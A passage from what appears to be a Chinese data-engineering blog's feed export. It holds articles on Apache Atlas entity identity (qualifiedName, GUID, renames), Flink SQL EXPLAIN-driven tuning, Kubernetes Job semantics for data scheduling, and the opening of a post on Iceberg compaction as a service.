<h2 id="命名空间必须由平台管理"><a href="#命名空间必须由平台管理" class="headerlink" title="命名空间必须由平台管理"></a>命名空间必须由平台管理</h2><p>我遇到过最麻烦的做法，是让每个采集插件自己拼 qualifiedName。Hive 插件用 <code>db.table@cluster</code>，JDBC 插件用 <code>host:port/database/schema/table</code>，文件插件直接用 URI，另一个团队又把租户放在最前面。每个格式单独看都合理，放到血缘和权限系统里就无法稳定关联。</p>
<p>平台至少要集中定义四件事。</p>
<p>第一，环境边界。生产、预发、测试即使连的是相同技术类型，也不能因为逻辑名称相同就合并。环境最好是资源实例的属性，同时进入可计算的命名空间，不靠 UI 颜色区分。</p>
<p>第二，服务实例边界。两个 Hive Metastore、两个 Kafka 集群或两个 MySQL 实例里的同名对象不相等。host 可以参与实例注册，但不建议把易变的 VIP 或 IP 直接当永久身份；更稳妥的是给已登记的数据源实例分配稳定 ID，再把连接地址作为可变属性。</p>
<p>第三，大小写与转义规则。Hive Bridge 在构造 database&#x2F;table qualifiedName 时会转为小写。如果另一个入口保留大小写，同一张表可能产生两个实体。路径中的 <code>/</code>、数据库名中的特殊字符、默认 schema 的省略，都要在进入 Catalog 之前规范化。</p>
<p>第四，临时对象规则。Atlas 对 Hive temporary table 会把 session ID 或随机串加进表名，目的就是避免把两个会话的临时表合并。平台如果完全忽略临时对象，会丢失一部分运行血缘；如果把它们当永久资产，又会让搜索结果充满垃圾。身份策略要配合生命周期策略。</p>
<h2 id="GUID-稳定，不代表对象语义天然稳定"><a href="#GUID-稳定，不代表对象语义天然稳定" class="headerlink" title="GUID 稳定，不代表对象语义天然稳定"></a>GUID 稳定，不代表对象语义天然稳定</h2><p>Catalog 创建实体后通常会分配 GUID，后续关系、标签和血缘可以引用 GUID。GUID 适合作为内部稳定主键，但它不能替代业务身份规则。</p>
<p>一次采集如果因为 qualifiedName 拼法变化而找不到原实体，系统会创建新 GUID。旧标签、负责人、热度和血缘仍挂在旧 GUID 上，用户看到的就是两张“长得一样”的表。相反，如果错误地复用了 qualifiedName，另一个物理对象的属性可能覆盖到原 GUID，问题更隐蔽。</p>
<p>所以采集写入不能直接执行“查不到就创建”。我会先记录 source identity、normalized qualifiedName、matched GUID 和匹配方式。新增、更新、冲突、疑似重命名应该是不同结果：</p>
<table>
<thead>
<tr>
<th>结果</th>
<th>判断</th>
<th>动作</th>
</tr>
</thead>
<tbody><tr>
<td>精确匹配</td>
<td>type 与 qualifiedName 一致</td>
<td>更新可变属性</td>
</tr>
<tr>
<td>首次出现</td>
<td>无匹配且命名空间有效</td>
<td>创建实体</td>
</tr>
<tr>
<td>唯一键冲突</td>
<td>同键出现不兼容的物理属性</td>
<td>隔离并告警</td>
</tr>
<tr>
<td>疑似重命名</td>
<td>新键与旧实体具有强关联证据</td>
<td>进入迁移流程，不自动合并</td>
</tr>
</tbody></table>
<p>这张映射表还能解释采集幂等性。Kafka 消息重复、Hook 重试或全量爬取重复执行时，只要同一业务对象归一到同一 unique key，就会更新原实体，而不是不断制造副本。</p>
<h2 id="重命名和迁移要明确是“同一对象”还是“新对象”"><a href="#重命名和迁移要明确是“同一对象”还是“新对象”" class="headerlink" title="重命名和迁移要明确是“同一对象”还是“新对象”"></a>重命名和迁移要明确是“同一对象”还是“新对象”</h2><p>SQL 的 <code>ALTER TABLE old RENAME TO new</code> 看起来是改名，Catalog 却要决定历史怎样延续。如果业务认为表只是换了名称，最好保留原 GUID，更新 qualifiedName，并记录 old qualifiedName 的别名或变更事件。这样标签、负责人和历史血缘仍指向同一实体。</p>
<p>但不是所有名字变化都属于重命名。把表从测试集群 CTAS 到生产集群，即便字段完全相同，也通常是两个对象和一条派生关系。把 HDFS 表迁到 Iceberg，物理位置和访问语义都变了，也可能需要创建新实体，再用 migration&#x2F;derived-from 关系连接，而不是原地改 <code>typeName</code>。</p>
<p>判断依据不能只有“名字像”。我会组合 DDL 事件、操作类型、源&#x2F;目标实例、schema 指纹、location、创建时间和运行实例。只有明确的 rename event 才自动延续身份；相似度匹配最多给出候选，不能直接改 GUID。</p>
<p>删除也不是立即从图里擦掉。Catalog 需要把实体标记为 DELETED 或归档，保留历史 lineage 和审计。随后同名表重新创建时，是恢复旧实体还是产生新实体，要结合底层系统是否保留原 object ID、创建时间和删除间隔。单靠 qualifiedName 相同无法判断。</p>
<h2 id="跨系统关联要保留“映射”，不要硬造全局名字"><a href="#跨系统关联要保留“映射”，不要硬造全局名字" class="headerlink" title="跨系统关联要保留“映射”，不要硬造全局名字"></a>跨系统关联要保留“映射”，不要硬造全局名字</h2><p>统一 Catalog 经常希望把 Hive、Iceberg、Trino 和 BI 系统看到的对象合并成一张资产。这里容易走向另一个极端：设计一条覆盖所有系统的超长 global qualifiedName，然后要求每个插件都能精确生成。</p>
<p>实际上一份数据会有多个合法身份。Iceberg table 有 catalog namespace 与 table identifier，Hive Metastore 有 database&#x2F;table，存储层有 location，Trino 又通过 catalog.schema.table 暴露。它们可能一一对应，也可能多对一、一对多。把所有身份强行压成一个字符串，会丢掉这种关系。</p>
<p>我更倾向于让每种实体类型保留自己的规范身份，再建立显式映射：<code>logical_dataset</code> 代表业务资产，<code>hive_table</code>、<code>iceberg_table</code>、<code>rdbms_table</code> 代表技术对象，<code>storage_path</code> 代表物理位置。映射关系要带来源、置信度、有效期和确认状态。</p>
<p>这样做搜索时可以按逻辑资产聚合，排障时又能落回具体对象。更重要的是，当连接地址、Catalog 名或引擎映射变化时，只更新相应技术对象与映射，不必重写整张元数据图。</p>
<h2 id="上线前用冲突样本验身份规则"><a href="#上线前用冲突样本验身份规则" class="headerlink" title="上线前用冲突样本验身份规则"></a>上线前用冲突样本验身份规则</h2><p>对象标识方案不能只用几张正常表验证。我会准备一组容易撞边界的样本：不同环境同名表、不同集群同名库、大小写不同的表、带特殊字符的字段、临时表、rename 后的表、删除后同名重建，以及同一路径被两个 Catalog 注册。</p>
<p>每个样本都连续采集两次，确认第二次不会新增实体；再改变一个维度，确认该合并的仍命中原 GUID，该分开的会生成新实体。最后检查血缘边、标签和 owner 是否跟着正确的 GUID 走。</p>
<p>运行中还要监控 qualifiedName collision、同源多 GUID、同 GUID 多物理位置和短时间大量新增&#x2F;删除。采集成功率 100% 不能证明身份正确，因为错误合并同样会返回成功。</p>
<p>Catalog 真正难的不是把元数据收进来，而是多年以后仍能回答“这是不是当年的那个对象”。把 <code>name</code>、qualifiedName、GUID、物理位置和逻辑资产各自的职责分开，搜索、血缘、权限和审计才有可靠的地基。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/addons/models/0000-Area0/0010-base_model.json#L54-L68">Atlas 2.2.0 基础模型：<code>Referenceable.qualifiedName</code> 必填、可索引且唯一</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/addons/hive-bridge/src/main/java/org/apache/atlas/hive/bridge/HiveMetaStoreBridge.java#L859-L932"><code>HiveMetaStoreBridge</code>：database、table 与 column qualifiedName 的生成规则</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/webapp/src/main/java/org/apache/atlas/web/rest/EntityREST.java#L257-L295"><code>EntityREST</code>：使用 type 与 unique attribute 定位并更新实体</a></li>
<li><a href="https://github.com/apache/atlas/blob/1a4735939f3ec3ed225f1d12e40653b8eaf610b3/intg/src/main/java/org/apache/atlas/model/instance/AtlasObjectId.java#L156-L178"><code>AtlasObjectId.equals()</code>：无 GUID 时按 typeName 与 uniqueAttributes 判断对象</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Atlas</tag>
        <tag>元数据</tag>
        <tag>Catalog</tag>
      </tags>
  </entry>
  <entry>
    <title>Flink SQL 调优为什么先看 EXPLAIN：Join、Exchange 与 Changelog 的代价</title>
    <url>//2022/04/26/flink-sql-plan-first/</url>
    <content><![CDATA[<p>Flink SQL 作业变慢后，最常见的动作是加并行度、调 managed memory、扩大 checkpoint timeout。这样有时能缓解问题，但也容易把一份错误的物理计划跑得更贵。</p>
<p>我接手一条 SQL 时，第一份材料不是 Web UI 截图，而是当时 Catalog、配置和 SQL 共同生成的 <code>EXPLAIN</code>。SQL 只是意图，真正消耗网络、状态和 CPU 的是优化后的物理节点。Join 选了广播还是 shuffle、聚合有没有两阶段、哪条边产生 Exchange、输出是 append 还是 retract，这些决定比一个笼统的“数据量大”更接近根因。</p>
<p class="article-diagram-scroll"><img src="/images/articles/flink-sql-plan-first.svg" class="lazyload" data-srcset="/images/articles/flink-sql-plan-first.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Flink SQL 从计划到运行证据的诊断链路"></p>
<span id="more"></span>

<h2 id="一条-SQL-至少要看三层结果"><a href="#一条-SQL-至少要看三层结果" class="headerlink" title="一条 SQL 至少要看三层结果"></a>一条 SQL 至少要看三层结果</h2><p>Flink 1.14.4 的 <code>EXPLAIN</code> 会展示抽象语法树、优化后的物理计划以及物理执行计划。<code>EXPLAIN ESTIMATED_COST, CHANGELOG_MODE, JSON_EXECUTION_PLAN</code> 还能附带估算成本、每个物理节点的 changelog mode 和 JSON 执行图。</p>
<p>抽象语法层适合确认字段解析、过滤条件和 Join 条件有没有被正确识别。比如本来写的是等值 Join，隐式类型转换却让条件变得复杂；或者一个 UDF 包住分区字段，使 filter 无法下推。这些问题在运行指标里只表现为“输入很多”，计划却能看到过滤还停在上层。</p>
<p>优化后的物理计划是调优的重点。它已经选择了 operator、数据交换方式和聚合阶段。看到 <code>Exchange</code>，就要问数据为什么需要按 key 重新分区；看到 BroadcastHashJoin，就要验证 build side 估算是否可信；看到单阶段聚合，就要查局部预聚合为何没有生效。</p>
<p>JSON execution plan 更接近最终作业图，可以用来做版本间 diff。但我不会只保存一张截图。发布平台应该保存 SQL hash、Catalog snapshot、TableConfig、Flink 版本与原始 explain text；否则两次计划不同，到底是 SQL 改了、统计信息变了，还是默认配置变化，事后无法判断。</p>
<h2 id="Join-慢，先确认数据移动方式"><a href="#Join-慢，先确认数据移动方式" class="headerlink" title="Join 慢，先确认数据移动方式"></a>Join 慢，先确认数据移动方式</h2><p>批 SQL 的 Hash Join 常见两条路径：BroadcastHashJoin 把较小一侧发送到每个并行实例，ShuffleHashJoin 则按 Join key 重分区两侧数据。Flink 的 <code>BatchPhysicalHashJoinRule</code> 会结合可用 operator 与成本判断是否广播。</p>
<p>广播不是“没有 shuffle”。小表仍然要传到每个下游实例，总代价约等于小表大小乘下游并行度。统计信息低估时，一张实际数 GB 的表可能被广播到几十个 TaskManager，网络与内存同时被击穿。只把 broadcast threshold 调小，可能又把所有任务推向双边 shuffle。</p>
<p>我会从计划里记录 build&#x2F;probe side、estimated row count、selected join strategy 和 Exchange distribution，再用运行指标核对真实 input bytes、records、spill 与 busy time。估算和运行差一个数量级时，先修统计信息或数据分布认知，不急着调 operator 参数。</p>
<p>流 Join 还要看时间边界。Regular Join 会保留两侧历史状态，状态大小取决于 key 基数和输入累积，不是简单的每秒吞吐。Interval Join、Temporal Join 和 Lookup Join 的状态语义不同。SQL 都写成 <code>JOIN</code>，计划里的 operator 才告诉我系统准备怎样保存与匹配数据。</p>
<h2 id="Exchange-往往是数据倾斜暴露的位置"><a href="#Exchange-往往是数据倾斜暴露的位置" class="headerlink" title="Exchange 往往是数据倾斜暴露的位置"></a>Exchange 往往是数据倾斜暴露的位置</h2><p>一个 <code>GROUP BY tenant_id</code> 必须让相同 key 到同一并行实例。计划里的 hash Exchange 是语义要求，不是可以随手删掉的多余步骤。真正要查的是 key 分布是否让某个分区承受了大部分数据。</p>
<p>只看作业整体吞吐会掩盖倾斜。平均每个 subtask 处理一百万行，可能实际是一个 subtask 处理八百万，其他七个几乎空闲。计划告诉我哪条边按什么字段分区，运行指标再验证各 subtask 的 records、bytes、busy&#x2F;backpressure 是否分散。</p>
<p>倾斜治理也要回到语义。加盐后做两阶段聚合适合可结合的 SUM&#x2F;COUNT，却不能无条件套到所有 UDAF。热点 key 拆分后再合并，会改变 distinct、topN 或顺序敏感函数的成本。先从计划判断是否已有 local&#x2F;global 两阶段，再决定是否改 SQL。</p>
<p>Flink 的 planner 会在条件允许时生成两阶段聚合；流作业的 mini-batch 也能减少状态访问，但它引入允许延迟，并且需要同时设置 enabled、allow-latency 和 size。把 mini-batch 当成“性能开关”开启，却不确认下游时效 SLA，是用语义换吞吐而没有登记代价。</p>
<h2 id="Changelog-Mode-决定下游收到什么"><a href="#Changelog-Mode-决定下游收到什么" class="headerlink" title="Changelog Mode 决定下游收到什么"></a>Changelog Mode 决定下游收到什么</h2><p>流式 SQL 的结果不一定只追加。聚合值随新数据变化时，operator 可能输出 update-before、update-after；某些 Join 和去重还会产生 delete。<code>EXPLAIN CHANGELOG_MODE</code> 能把每个物理节点的 <code>I / UB / UA / D</code> 组合展示出来。</p>
<p>这项信息对 sink 很关键。下游 Kafka append topic 收到更新流，如果没有主键和 upsert 语义，就会把同一业务结果保存多份。JDBC sink 即使支持 upsert，主键选择不当也可能造成热点锁。作业运行成功不代表最终表语义正确。</p>
<p>我会沿计划从 source 往 sink 看 changelog 如何变化：哪个聚合第一次产生更新，哪个节点做了 normalize，sink 声明接受什么模式。若 planner 为适配 sink 插入额外物化或 normalize，状态和网络成本也应该进入评估。</p>
<p>这一步还能发现“为什么换个 sink 计划就变了”。Flink 优化的是从 source 到 sink 的整体 DAG，sink ability 与 changelog 要求会反向影响上游。只拿 <code>SELECT</code> 单独 explain，有时与真实 <code>INSERT INTO</code> 的计划不同，生产诊断应 explain 完整 DML。</p>
<h2 id="Cost-是估算，不是运行事实"><a href="#Cost-是估算，不是运行事实" class="headerlink" title="Cost 是估算，不是运行事实"></a>Cost 是估算，不是运行事实</h2><p><code>ESTIMATED_COST</code> 输出 row count、CPU、IO 和 network 等估算，用来解释优化器为什么在候选计划中做出选择。它不是对生产耗时的承诺。缺少统计信息时，估算值可能来自默认规则；流式无界数据也不能像有限批次那样得出最终行数。</p>
<p>因此我会同时保留 plan evidence 与 runtime evidence：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">计划：节点类型、估算行数、distribution、changelog、并行度</span><br><span class="line">运行：输入输出记录、bytes、busy/idle/backpressure、state、checkpoint</span><br></pre></td></tr></table></figure>

<p>两者一致时，计划能解释瓶颈。例如 hash Exchange 后一个 subtask 长期 busy，key 分布也高度倾斜。两者不一致时，差异本身就是线索：估算小表实际很大，说明统计信息过期；计划认为 filter 可下推但 source 读取量没降，说明 connector 没有真正执行下推或谓词不被支持。</p>
<p>不要用运行时偶然正常来证明计划合理。低峰期一条全量 shuffle SQL也可能按时完成，数据翻倍后才暴露。计划 review 的价值在发布前发现成本结构，而不是出故障后补一张图。</p>
<h2 id="我会怎样做一次计划级调优"><a href="#我会怎样做一次计划级调优" class="headerlink" title="我会怎样做一次计划级调优"></a>我会怎样做一次计划级调优</h2><p>第一步固定输入：SQL 文本、DDL、Catalog 对象版本、统计信息、所有 <code>table.*</code> 配置和 Flink 构建版本。没有同一份输入，前后计划不可比。</p>
<p>第二步用完整 <code>INSERT</code> 生成带 <code>ESTIMATED_COST</code>、<code>CHANGELOG_MODE</code> 的 explain，逐节点标记 source pruning、filter&#x2F;project pushdown、Exchange、Join、Aggregate、Rank、Normalize 和 sink。</p>
<p>第三步形成一个明确假设。例如“维表统计过期导致错误广播”，而不是“内存可能不足”。修改一项配置、统计或 SQL 后重新生成计划，确认目标节点确实变化。</p>
<p>第四步才在可控数据集上运行，对照 records、bytes、state 和 checkpoint。吞吐提高但 changelog 变了，或者结果校验不一致，都不能算优化成功。</p>
<p>最后把 explain diff 与运行结果一起进入发布记录。Flink SQL 的性能问题经常跨 planner、runtime 和业务数据分布三层，计划是把它们串起来的第一张地图。先读地图，再加机器，排障会少很多试错。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/flink/blob/895c60940a8a7c95bef1ebe9f92c0baf168be145/docs/content/docs/dev/table/sql/explain.md#L27-L60">Flink 1.14.4 EXPLAIN 文档：逻辑计划、物理计划与详细选项</a></li>
<li><a href="https://github.com/apache/flink/blob/895c60940a8a7c95bef1ebe9f92c0baf168be145/docs/content/docs/dev/table/sql/explain.md#L275-L288">Flink 1.14.4 EXPLAIN：ESTIMATED_COST、CHANGELOG_MODE 与 JSON_EXECUTION_PLAN</a></li>
<li><a href="https://github.com/apache/flink/blob/895c60940a8a7c95bef1ebe9f92c0baf168be145/flink-table/flink-table-planner/src/main/scala/org/apache/flink/table/planner/delegation/StreamPlanner.scala#L116-L174"><code>StreamPlanner.explain()</code>：根据 ExplainDetail 生成成本、Changelog 与 JSON 计划</a></li>
<li><a href="https://github.com/apache/flink/blob/895c60940a8a7c95bef1ebe9f92c0baf168be145/flink-table/flink-table-planner/src/main/scala/org/apache/flink/table/planner/plan/rules/physical/batch/BatchPhysicalHashJoinRule.scala#L43-L72"><code>BatchPhysicalHashJoinRule</code>：Broadcast 与 Shuffle Hash Join 的物理规则</a></li>
<li><a href="https://github.com/apache/flink/blob/895c60940a8a7c95bef1ebe9f92c0baf168be145/flink-table/flink-table-api-java/src/main/java/org/apache/flink/table/api/config/ExecutionConfigOptions.java#L294-L329"><code>ExecutionConfigOptions</code>：mini-batch 开启条件与延迟、大小配置</a></li>
</ul>
]]></content>
      <categories>
        <category>实时计算</category>
      </categories>
      <tags>
        <tag>Flink SQL</tag>
        <tag>执行计划</tag>
        <tag>性能诊断</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes 跑数据任务，不能把 Pod 状态直接当调度实例状态</title>
    <url>//2022/05/09/kubernetes-data-job-scheduling/</url>
    <content><![CDATA[<p>把数据任务从 YARN 或固定机器迁到 Kubernetes，最容易做的一步是把命令装进镜像，创建一个 Job。最容易出问题的一步，是把原来调度系统的实例语义原样套在 Pod 上。</p>
<p>数据平台关心的是某个业务日期、某次补数、某次人工重跑有没有完成，并且输出是否能被下游使用。Kubernetes 关心的是控制器怎样让指定数量的 Pod 成功结束。两者有交集，但不是同一件事。<code>Pod Succeeded</code>、<code>Job Complete</code> 和“这批数据已经正确提交”之间，必须有一层明确映射。</p>
<p class="article-diagram-scroll"><img src="/images/articles/kubernetes-data-job-scheduling.svg" class="lazyload" data-srcset="/images/articles/kubernetes-data-job-scheduling.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="数据平台调度实例与 Kubernetes Job 的职责边界"></p>
<span id="more"></span>

<h2 id="一个调度实例不要直接等于一个-Pod"><a href="#一个调度实例不要直接等于一个-Pod" class="headerlink" title="一个调度实例不要直接等于一个 Pod"></a>一个调度实例不要直接等于一个 Pod</h2><p>Pod 是一次执行载体，不是稳定的业务实例。Node 故障、驱逐、容器失败或控制器判断 Pod 丢失时，同一个 Job 可能创建新的 Pod。使用 <code>restartPolicy: OnFailure</code> 时，容器还可能在同一个 Pod 内重启；使用 <code>Never</code> 时，失败通常表现为新 Pod attempt。</p>
<p>如果平台只保存 <code>pod_name</code>，第一次失败后新建 Pod，日志链路就断了。更稳妥的标识层级是：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">schedule_instance_id</span><br><span class="line">  -&gt; kubernetes_job_uid</span><br><span class="line">      -&gt; pod_uid / attempt</span><br><span class="line">          -&gt; container restart count</span><br></pre></td></tr></table></figure>

<p>平台实例在最外层，承载业务日期、上游依赖和补数范围；Job UID 是本次向 Kubernetes 提交的控制对象；Pod UID 表示一次真实调度；同一 Pod 的 container restart 还要单独计数。名称可以复用，UID 才能区分删除重建后的对象。</p>
<p>我通常让 Job label 带 <code>instance_id</code>，同时在平台数据库保存 Job namespace、name、UID、resourceVersion 和提交时间。回收状态时用 UID 防止误认同名新 Job，采集日志时则把 instance、Job 与 Pod 三层 ID 一起写进上下文。</p>
<h2 id="backoffLimit-不是数据任务的业务重试策略"><a href="#backoffLimit-不是数据任务的业务重试策略" class="headerlink" title="backoffLimit 不是数据任务的业务重试策略"></a><code>backoffLimit</code> 不是数据任务的业务重试策略</h2><p>Kubernetes 1.24 的 <code>JobSpec.backoffLimit</code> 控制 Job 在被标记失败前允许的重试次数，controller 对失败 Pod 采用指数退避。它解决的是执行容器失败后的控制循环，不知道 SQL 是否幂等，也不知道输出目录是否已写了一半。</p>
<p>数据平台的“重跑”通常含有更丰富的语义：复用原业务日期还是生成新实例、是否清理输出、是否从 checkpoint 恢复、是否级联重跑下游、人工修改参数后能否继续。把这些全交给 <code>backoffLimit</code>，平台只会看到一个 Job 长时间 Active，里面已经执行了多次有副作用的尝试。</p>
<p>我会把基础设施级短重试与业务重跑分开。镜像拉取、Node 瞬时故障、进程启动异常可以由 Job 做少量重试；涉及写外部系统、提交分区或消费 offset 的任务，要么自己实现幂等&#x2F;事务，要么失败后回到平台创建新的受控 attempt。</p>
<p><code>activeDeadlineSeconds</code> 也不是简单的 Pod 超时。Job 级 deadline 会覆盖 backoffLimit，超时后终止仍在运行的 Pod，并把 Job 标记失败。数据任务若还有优雅停止、checkpoint 或外部提交过程，平台要预留 termination grace period，并记录究竟是业务超时、Job deadline，还是平台主动取消。</p>
<h2 id="Job-Complete-仍然不能证明输出只产生一次"><a href="#Job-Complete-仍然不能证明输出只产生一次" class="headerlink" title="Job Complete 仍然不能证明输出只产生一次"></a>Job Complete 仍然不能证明输出只产生一次</h2><p>Kubernetes Job 追求指定数量的成功 completion。分布式环境里，控制器与 kubelet 对状态的观察存在窗口；应用不能假设“每个逻辑工作单元一定只启动一次”。Kubernetes API 对 Indexed Job 提供 completion index，用来让并行任务识别各自编号，但这也不自动提供外部存储的 exactly-once。</p>
<p>一个导数任务可能已经把文件上传完成，进程却在上报成功前断开；下一次 attempt 会再次写同一批数据。反过来，容器 exit code 为 0，但最终表分区提交失败，Job 仍可能 Complete。</p>
<p>因此成功条件应该由任务协议定义。我会让执行端返回结构化结果，其中至少有 output version、row&#x2F;file count、commit ID 和校验状态。平台收到 Job Complete 后还要读取这份结果，确认输出已原子发布，再把调度实例改成 SUCCESS。</p>
<p>对于 HDFS 分区，可以先写 attempt 临时目录，再由单一 committer 发布；对象存储上不要依赖 rename 假装原子；Iceberg 这类表格式则记录 committed snapshot ID。Kubernetes 只负责进程生命周期，数据提交边界仍属于执行引擎和存储协议。</p>
<h2 id="Scheduler-只看-requests，不懂任务峰值"><a href="#Scheduler-只看-requests，不懂任务峰值" class="headerlink" title="Scheduler 只看 requests，不懂任务峰值"></a>Scheduler 只看 requests，不懂任务峰值</h2><p>Kubernetes scheduler 主要依据 Pod resource requests、Node 可分配资源和各种约束做放置。容器的 limit 影响运行期限制，但一个 memory limit 很大、request 很小的 Pod，仍可能被塞进看似有空间的 Node；多个任务同时到峰值时再一起 OOM。</p>
<p>数据任务的资源曲线通常不平：DataX 在并发 channel 拉起后增长，Spark&#x2F;Flink driver 与 executor 职责不同，压缩和排序阶段有明显峰值。按平均 RSS 填 request 会提高表面利用率，却降低峰值重叠时的稳定性。</p>
<p>我会按角色拆模板。提交端、JobManager、TaskManager、单机同步任务分别定义 request&#x2F;limit，不用一套固定比例。request 用可接受的常态峰值，limit 用异常保护边界；再结合队列并发控制，避免同一租户瞬间创建大量 Pod 把整个集群占满。</p>
<p>Pending 也要按调度原因分类。<code>Insufficient memory</code>、taint&#x2F;toleration、node affinity、PVC binding、镜像拉取和 quota 是不同故障。平台若只显示“资源不足”，用户会反复调大内存，实际可能是 Pod 根本不允许落到任何 Node。</p>
<h2 id="CronJob-不能替代数据依赖调度"><a href="#CronJob-不能替代数据依赖调度" class="headerlink" title="CronJob 不能替代数据依赖调度"></a>CronJob 不能替代数据依赖调度</h2><p>Kubernetes CronJob 能按时间创建 Job，并提供 <code>Allow</code>、<code>Forbid</code>、<code>Replace</code> 三种 concurrencyPolicy。它很适合独立的周期任务，却不理解数据日期、上游产出和补数区间。</p>
<p><code>Forbid</code> 的含义是上一 Job 还在运行时跳过这次创建，不是把本次业务日期排队等待。<code>Replace</code> 会用新 Job 替换仍运行的旧 Job，也不等于安全地结束旧数据实例并接管状态。对有依赖的数据链路，直接使用 CronJob 会把“没创建”和“等待依赖”混在一起。</p>
<p>我倾向于保留数据调度器作为控制面，由它在依赖满足后创建普通 Job。CronJob 可以跑平台自身的巡检、清理和无依赖采集，但业务实例仍由调度状态机管理。这样补 30 天数据时，可以显式生成 30 个业务日期实例，按限流策略投递，而不是改一段 cron 等它慢慢触发。</p>
<h2 id="状态回收必须处理观察空窗"><a href="#状态回收必须处理观察空窗" class="headerlink" title="状态回收必须处理观察空窗"></a>状态回收必须处理观察空窗</h2><p>平台监听 watch 事件很高效，但 watch 断开、resourceVersion 过期或服务重启都会产生观察空窗。只消费事件流而不做周期 reconciliation，某个 Job 已经完成，平台仍可能永远停在 RUNNING。</p>
<p>回收逻辑应该同时看 Job conditions、active&#x2F;succeeded&#x2F;failed 计数、关联 Pod 状态、container termination reason 和任务结果文件。状态优先级也要固定：平台主动停止后，即使 Pod 因 SIGTERM 报 Failed，也应保留 CANCELED 的业务语义；Job deadline 超时与应用 exit 1 不能都折成 FAILED。</p>
<p>删除资源要晚于证据收集。<code>ttlSecondsAfterFinished</code> 可以让 controller 自动清理已结束 Job 及其依赖对象，但如果 TTL 比日志和结果回收窗口还短，排障材料会先消失。我会先把终止状态、Pod UID、exit code、reason、日志位置和输出提交证据固化，再允许 TTL 回收。</p>
<p>Kubernetes 给数据平台带来弹性和统一资源管理，但它不会自动继承原调度器的业务语义。把实例、Job、Pod、attempt 与数据提交五个层次分开，迁移后的任务才不只是“容器能跑”，而是仍然可诊断、可重试、可验证。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/batch/v1/types.go#L91-L121">Kubernetes 1.24 <code>JobSpec</code>：parallelism、completions、deadline 与 backoffLimit</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/batch/v1/types.go#L147-L184">Kubernetes 1.24 <code>JobSpec</code>：TTL 与 Indexed&#x2F;NonIndexed completion mode</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/batch/v1/types.go#L373-L432">Kubernetes 1.24 <code>CronJobSpec</code>：schedule 与 concurrencyPolicy</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/core/v1/types.go#L2679-L2689">Kubernetes 1.24 <code>RestartPolicy</code>：Always、OnFailure 与 Never</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/core/v1/types.go#L3085-L3110">Kubernetes 1.24 <code>PodSpec</code>：容器重启策略与 Pod deadline</a></li>
</ul>
]]></content>
      <categories>
        <category>资源治理</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>数据调度</tag>
        <tag>批任务</tag>
      </tags>
  </entry>
  <entry>
    <title>Compaction 为什么要做成持续服务：从小文件阈值到 File Group 提交</title>
    <url>//2022/05/14/compaction-as-service/</url>
    <content><![CDATA[<p>很多团队第一次治理小文件，会加一个凌晨两点的 Spark 脚本：扫描昨天的分区，把文件合到 512 MB。刚上线时效果明显，过一阵又会遇到任务跑不完、与实时写入冲突、刚合完第二天又碎了，最后脚本变成一个没人敢停的定时黑盒。</p>
<p>我更愿意把 Compaction 看成表的持续维护服务。它不是“每天执行一次重写”，而是一条有输入指标、候选选择、预算、提交证据和效果验收的控制循环。表什么时候需要整理、整理哪部分、允许花多少资源、失败后如何继续，都应该可计算。</p>
<p class="article-diagram-scroll"><img src="/images/articles/compaction-as-service.svg" class="lazyload" data-srcset="/images/articles/compaction-as-service.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Compaction 从表体检到效果验收的服务闭环"></p>
<span id="more"></span>

<h2 id="小文件数量不是唯一触发条件"><a href="#小文件数量不是唯一触发条件" class="headerlink" title="小文件数量不是唯一触发条件"></a>小文件数量不是唯一触发条件</h2><p>Iceberg 0.13.1 的维护文档指出，更多 data files 会增加 manifest 元数据，并让查询承担更多文件打开成本；<code>rewriteDataFiles</code> 可以把小文件合并成较大的文件。这个方向没问题，但“文件小于 128 MB 就合并”仍然太粗。</p>
<p>冷分区有一千个 20 MB 文件，如果一年没人查询，立刻花一轮 TB 级 IO 未必划算。热分区只有几十个文件，但每个查询都要应用大量 delete files，重写收益反而更高。Compaction 的候选分数至少应包含：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">收益：减少文件数 + 减少 delete 合并 + 改善排序/裁剪 + 降低规划时间</span><br><span class="line">成本：读取字节 + 写入字节 + 计算时长 + catalog 提交 + 冲突概率</span><br></pre></td></tr></table></figure>

<p>我会把表指标分成三层。文件层看 size 分布、record count、delete count 和 partition；查询层看 scan planning time、opened files、实际读取比例和热点过滤字段；写入层看 commit 频率、平均每次新增文件数以及更新模式。只有文件层，服务只能机械合并；加上读写层，才能优先处理真正影响 SLA 的区域。</p>
